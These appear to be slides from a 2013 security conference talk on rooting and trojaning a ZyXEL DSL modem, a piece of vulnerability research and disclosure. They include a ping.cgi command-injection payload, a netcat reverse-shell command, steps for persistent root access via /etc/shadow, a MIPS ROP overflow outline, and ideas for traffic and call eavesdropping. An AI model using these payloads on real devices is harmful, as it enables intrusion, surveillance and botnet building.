HOW I MET YOUR MODEM
EXPLOIT & TROJAN DEV FOR CONSUMER DSL DEVICES
HACK IN THE BOX 2013 AMSTERDAM - PETER GEISSLER & STEVEN KETELAAR

WHO ARE WE?

STEVEN
 Software developer  Security fanatic  Produces dance music  Eindbazen CTF

INTRODUCTION
 What is a DSL modem?  Why should we care about them?  Why did we do this research?
Thursday, April 11, 13

ZYXEL
Interfaces on a typical ZyXEL modem
Thursday, April 11, 13

THE MODEM WE HACKED
ZyXEL P-2601HN-F1
Thursday, April 11, 13

BASIC FEATURES
 Routing DSL traffic  Network Address Translation  Voice over IP Telephony  Management through HTTP, telnet/SSH  Protects you from the Internet (firewall)
Thursday, April 11, 13

REGULAR NETWORK SETUP

OUR TEST NETWORK SETUP

ZYXEL MANAGEMENT INTERFACES
Thursday, April 11, 13

LOCAL MANAGEMENT - SSH/TELNET
ZyShell A limited shell that allows to control
modem specific functionality
Thursday, April 11, 13

LOCAL MANAGEMENT - HTTP
Welcome screen shows all connected devices
Thursday, April 11, 13

PING.CGI
Diagnostic utility provided by the Zyxel webinterface

Thursday, April 11, 13

Ping utility output looks familiar to the Linux ping command

PING.CGI - OWNED
Using a semicolon allows us to enter shell commands:

 ;id;

uid=0(root) gid=0(root)

Thursday, April 11, 13

PING.CGI - OVERVIEW
 Arbitrary command execution  Input is not filtered in any way  Length of command limited (max 36 chars)  Command runs as root (uid=0)  Connectback shell is possible
Thursday, April 11, 13

PING.CGI - EXPLOIT
We wrote an ugly bash script to execute commands on the Zyxel
 Authenticates against the device (login.cgi)  Executes the command and filters the output  Easy to use tool to enter a command and see the output
Thursday, April 11, 13

PING.CGI - EXPLOIT EXAMPLE
 Executing our shellscript  cmd = nc 192.168.1.69 6 -e sh
Spawns a shell at our listener
Thursday, April 11, 13

DEMO TIME - LOCAL EXPLOIT
Thursday, April 11, 13

PERSISTENT SHELL
 Replacing /etc/passwd to update home folder of `admin' user to break out of ZySHELL jail
 Replacing /etc/shadow hash for root user to be able to `su' to root
 Now we can just SSH into the modem
Thursday, April 11, 13

LOCAL BUG CONCLUSION
 Requires credentials/access to admin interface
 Requires access to LAN (by default)  Yields root privileges :-)

REMOTE MANAGEMENT
Thursday, April 11, 13

TR-069
"TR-069 (Technical Report 069) is a DSL Forum (which was later renamed as Broadband Forum) technical specification entitled CPE WAN Management Protocol (CWMP). It defines an application layer protocol for remote management of end-user devices."
Thursday, April 11, 13

TR-069 - OVERVIEW
 CWMP Protocol  Used for provisioning and configuration
deployment
 CPE: Customer Premise Equipment  ACS:Auto Configuration Server
Thursday, April 11, 13

TR-069 on ZYXEL - ZYTR069
 HTTP Daemon listening on TCP port 7676  Uses ZyXEL-RomPager/4.34  Accessible from any WAN connected host  Requires (HTTP Digest) authentication to do
anything useful
Thursday, April 11, 13

ZYTR069 Files
 /usr/sbin/zytr069main  /usr/sbin/zytr069cmd  /usr/lib/librompager.so  /var/S2_97Process  /var/pdm/config.xml
Thursday, April 11, 13

ZYTR069 CONFIGURATION
config.xml
Thursday, April 11, 13

ZYTR069 URI's
 /CWMP/ConnectionRequest  /UE/FormDisplay  /UE/ProcessForm  /UE/...
Thursday, April 11, 13

ZYTR069 User Exit Form

/UE/FormDisplay

/UE/ProcessForm

Thursday, April 11, 13

librompager.so test page for POST data

/UE/ProcessForm DoS
 More than ~50 characters of user input crashes zytr069main
 Effectively manages a ZyXEL modem unmanagable (Denial of Service)
 Might also potentially allow arbitrary code execution..
Thursday, April 11, 13

IDA TIME!
Thursday, April 11, 13

VULNERABILITY DETAILS
 handle_processForm (0x63448) is responsible for handling POST requests to the test form
 invokes RpGetFormItem() with a destination buffer on the stack of a fixed size (48 bytes)
 RpGetFormItem doesn't do any boundschecking and writes past end of buffer.
 Classic stack based buffer overflow.

BUILDING A MIPS TOOLCHAIN
 It would be nice if we could easily assemble/ compile shellcode and binaries for target.
 Some debugging tools like gdb(server) would also be nice..
 Compiling gcc, binutils, libc manually.. ? :(  buildroot to the rescue!  $ make menuconfig && make install  up and running with relative ease within an

WRITING AN EXPLOIT
 Buffer layout ["A"x48][ $PC ]  Use of basic Return Oriented Programming
techniques to bypass separated data/ instruction caches.
 Eventually runs own code (shellcode) to get interactive remote root shell
Thursday, April 11, 13

MIPS ROP
 MIPS ROP is kind of awkward  Separate I- and D-Cache.We need to work
around cache incoherency
 sleep() is a good way to force a contextswitch to happen and sync the CPU cache
 Stack is executable so we only need a minimal ROP chain before returning into shellcode. No ASLR either!
 instruction after branch or jump is always executed first
Thursday, April 11, 13

MIPS ROP - GADGETS PART I
set arg for sleep set t9 = s1 jump to gadget 2
set t9 = s1 = gadget 2 set s1 = sleep jump to gadget 2
set ra = gadget 3

Thursday, April 11, 13

jump to sleep

MIPS ROP - GADGETS PART II
set ra = gadget 4 set s1 = gadget 5 jump to gadget 4

Thursday, April 11, 13

set a1 = sp+184 jump to shellcode

FOR DSL MODEMS

LIVE HTTP SNOOPING
 Build libpcap for MIPS  Add minimal HTTP request parser  ???  PROFIT!

VOICE CALL EAVESDROPPING - PART II
 VoIPong - http://www.enderunix.org/voipong/  Not directly suitable for embedded trojan
use.. :-(
 But with some minimal modifications, it is! :-)

VOICE SNOOPING DEMO

TONS OF MORE "FUN"
 We won't focus on C&C right now..  It's just Linux(tm)  IPTables rocks!  SSLStrip is heavy..  DDoS?  Expensive outbound calls
Thursday, April 11, 13

THE BOTNET AUCTION BEGINS!

Thursday, April 11, 13

STARTING BID: $ 31337

CONCLUSION
 Consumer DSL devices are a viable target  Oldskool bugs inside of a black box  More focus on the security of these types of
devices is nescessary.
 A different architecture or obscure software won't stop a real hacker! ;-)
